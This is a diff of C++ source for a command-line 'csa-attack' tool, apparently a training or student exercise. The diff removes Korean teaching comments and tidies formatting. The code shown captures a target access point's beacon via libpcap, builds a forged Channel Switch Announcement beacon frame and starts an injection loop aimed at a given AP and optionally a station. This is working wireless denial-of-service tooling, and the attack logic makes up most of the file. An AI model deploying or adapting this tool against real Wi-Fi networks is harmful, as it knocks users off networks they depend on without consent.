@@ -1,5 +1,3 @@
-/*코드 재사용할 수 있도록 짜기*/
-
 #include <iostream>
 #include <string>
 #include <vector>
@@ -24,12 +22,10 @@ static void usage() {
         << "sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
 }
 
-// 필터가 이미 걸린 pcap에서 패킷 하나를 꺼내 outBuf에 저장
-// rc=0: 타임아웃, rc<0: 에러, PCAP_ERROR_BREAK: pcap_breakloop() 호출됨
 static bool capture_one(pcap_t* pcap, std::vector<uint8_t>& outBuf) {
     while (g_running.load()) {
-        pcap_pkthdr*   hdr = nullptr;  // 패킷 메타데이터 (길이, 타임스탬프 등)
-        const uint8_t* pkt = nullptr;  // 실제 패킷 데이터 포인터
+        pcap_pkthdr*   hdr = nullptr;
+        const uint8_t* pkt = nullptr;
         int rc = pcap_next_ex(pcap, &hdr, &pkt);
         if (rc == 0)                continue;
         if (rc == PCAP_ERROR_BREAK) return false;
@@ -37,26 +33,20 @@ static bool capture_one(pcap_t* pcap, std::vector<uint8_t>& outBuf) {
             std::cerr << "pcap_next_ex : " << pcap_geterr(pcap) << "\n";
             return false;
         }
-        outBuf.assign(pkt, pkt + hdr->caplen);  // 패킷 바이트를 벡터에 복사
+        outBuf.assign(pkt, pkt + hdr->caplen);
         return true;
     }
     return false;
 }
 
-static bool capture_first_beacon(pcap_t* pcap,
-                                 const Mac& apMac,
-                                 std::vector<uint8_t>& outBeacon)
-{
-    // management 프레임 중 beacon만, 해당 AP(addr3)에서 온 것만 필터링
+static bool capture_first_beacon(pcap_t* pcap, const Mac& apMac, std::vector<uint8_t>& outBeacon) {
     std::string filter_exp = "type mgt subtype beacon and wlan addr3 " + apMac.toString();
 
-    // 문자열 필터를 커널이 이해하는 BPF 바이트코드로 변환
     bpf_program fp;
     if (pcap_compile(pcap, &fp, filter_exp.data(), 1, PCAP_NETMASK_UNKNOWN) < 0) {
         std::cerr << "pcap_compile : " << pcap_geterr(pcap) << "\n";
         return false;
     }
-    // pcap_freecode는 pcap_compile 성공 후에만 호출
     if (pcap_setfilter(pcap, &fp) < 0) {
         std::cerr << "pcap_setfilter : " << pcap_geterr(pcap) << "\n";
         pcap_freecode(&fp);
@@ -71,13 +61,12 @@ static bool capture_first_beacon(pcap_t* pcap,
 }
 
 int main(int argc, char* argv[]) {
-
     if (argc < 3 || argc > 4) {
         usage();
         return 1;
     }
 
-    const char* ifname    = argv[1];
+    const char* ifname     = argv[1];
     Mac         apMac;
     Mac         staMac;
     bool        hasStation = false;
@@ -127,15 +116,13 @@ int main(int argc, char* argv[]) {
               << (hasStation ? "AP unicast" : "AP broadcast")
               << "\n";
 
-    /*1바이트 숫자들을 담는 가변(vector) 배열*/
     std::vector<uint8_t> beaconBuf;
     if (!capture_first_beacon(pcap, apMac, beaconBuf)) {
         pcap_close(pcap);
         return 0;
     }
     std::cout << "[+] captured beacon : " << beaconBuf.size() << " bytes\n";
-    /*.data: vector 내부 배열의 시작 주소를 달라는 것
-      .size: vector에 원소가 몇개가 들었나*/
+
     uint8_t outFrame[2048];
     size_t  outLen = build_csa_beacon(
         outFrame,
@@ -153,17 +140,10 @@ int main(int argc, char* argv[]) {
     std::cout << "[+] built CSA/ECSA frame : " << outLen << " bytes\n"
               << "[*] starting CSA attack ... (Ctrl+C to stop)" << std::endl;
 
-    Dot11* macHdr = reinterpret_cast<Dot11*>(outFrame + sizeof(Dot11RadioTap));
-    /*패킷에 붙이는 순서 번호*/
-    uint16_t     tx_seqCtrl = 0;
-    unsigned long sent_ok = 0;
+    Dot11*        macHdr     = reinterpret_cast<Dot11*>(outFrame + sizeof(Dot11RadioTap));
+    uint16_t      tx_seqCtrl = 0;
+    unsigned long sent_ok    = 0;
 
-    /*sendpacket
-    pcap_t: pcap 핸들
-    outframe: 보낼 패킷 데이터
-    static_cast<int>(outLen): 패킷 크기
-    0: 성공
-    -1: 실패*/
     while (g_running.load()) {
         macHdr->seqNum(tx_seqCtrl);
 
